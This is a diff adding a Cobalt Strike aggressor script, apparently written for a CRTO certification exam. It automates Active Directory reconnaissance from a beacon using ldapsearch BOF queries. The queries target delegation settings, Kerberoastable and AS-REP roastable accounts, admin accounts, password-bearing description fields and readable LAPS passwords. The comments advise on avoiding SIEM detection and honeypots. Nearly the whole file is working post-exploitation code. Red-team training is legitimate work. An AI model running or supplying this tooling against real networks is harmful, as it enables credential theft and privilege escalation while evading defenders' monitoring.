@@ -1,0 +1,53 @@
+# exam-recon.cna
+# CRTO Exam Day — Domain Recon Automation
+# Load: CS → Cobalt Strike → Script Manager → Load → C:\Tools\exam-recon.cna
+#
+# Requires SA.cna loaded first:
+#   C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna
+#
+# Two aliases — run bulk first, check SIEM, then run targeted.
+# All ldapsearch queries run as BOF — OPSEC-SAFE (no child process, no Event logs)
+# Output accumulates in CS beacon logs → scp to Ubuntu WSL → bofhound -i logs → BloodHound
+#
+# Usage:
+#   beacon> domain_recon_bulk       // BOFHound base data — run immediately on first beacon
+#   beacon> domain_recon_targeted   // sensitive queries — run after bulk confirms no alerts
+#
+# IMPORTANT: Use fireAlias() to invoke registered aliases — NOT direct function calls or binput.
+#   fireAlias($bid, "aliasname", "arg string") — dispatches into the CS alias command table
+#   ldapsearch($bid, args)  — FAILS: ldapsearch is an alias, not a sub (non-existent function error)
+#   binput($bid, "text")    — FAILS: only echoes text to console display, does not execute commands
+
+# ─────────────────────────────────────────────────────────────────────────────
+# BULK — feeds BOFHound/BloodHound, less suspicious (looks like domain sync)
+# Run immediately on first beacon. OPSEC-SAFE.
+# ─────────────────────────────────────────────────────────────────────────────
+alias domain_recon_bulk {
+    fireAlias($1, "ldapsearch", "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor");
+    fireAlias($1, "ldapsearch", "(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor");
+    fireAlias($1, "ldapsearch", "(objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName");
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TARGETED — sensitive attribute queries, known recon signatures in Elastic rules
+# Run after bulk completes and no SIEM alerts observed. OPSEC-SAFE (BOF) but
+# querying sensitive attributes (LAPS, delegation, AS-REP) may trigger detection.
+# ─────────────────────────────────────────────────────────────────────────────
+alias domain_recon_targeted {
+    # Unconstrained delegation — highest value, direct path to DA if any non-DC has it
+    fireAlias($1, "ldapsearch", "(userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl");
+    # Constrained delegation — can impersonate any user to delegated service
+    fireAlias($1, "ldapsearch", "(msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl");
+    # Resource-based constrained delegation (RBCD)
+    fireAlias($1, "ldapsearch", "(msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity");
+    # Kerberoastable service accounts — check SPN before roasting, avoid honeypots
+    fireAlias($1, "ldapsearch", "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName");
+    # AS-REP roastable — no Kerberos pre-auth required
+    fireAlias($1, "ldapsearch", "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName");
+    # AdminCount=1 — all accounts under AdminSDHolder (DA, EA, Schema Admins, etc.)
+    fireAlias($1, "ldapsearch", "(&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf");
+    # Descriptions — operators sometimes store passwords in the description field
+    fireAlias($1, "ldapsearch", "(&(samAccountType=805306368)(description=*)) --attributes samAccountName,description");
+    # LAPS — if readable, gives local admin password for instant lateral movement
+    fireAlias($1, "ldapsearch", "(ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd");
+}
